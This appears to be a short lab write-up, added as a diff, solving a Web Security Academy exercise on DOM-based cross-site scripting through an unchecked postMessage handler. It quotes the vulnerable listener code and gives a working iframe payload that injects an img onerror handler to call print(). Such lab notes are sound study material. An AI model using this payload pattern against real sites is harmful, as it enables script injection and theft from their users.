@@ -1,0 +1,20 @@
+goal:
+    use exploit server to post a message
+    cause print() function
+
+analysis:
+    after investigating into web 
+    we find vulnerability in this script:
+        <script>
+            window.addEventListener('message', function(e) {
+                document.getElementById('ads').innerHTML = e.data;
+            })
+        </script>
+
+    try to load payload to post a message 
+
+payload:
+
+<iframe src="https://0ab900e9049e4b0fc4525b4d00dc00ea.web-security-academy.net/" onload="this.contentWindow.postMessage('<img src=1 onerror=print()>','*')"></iframe>
+
+=> solved lab
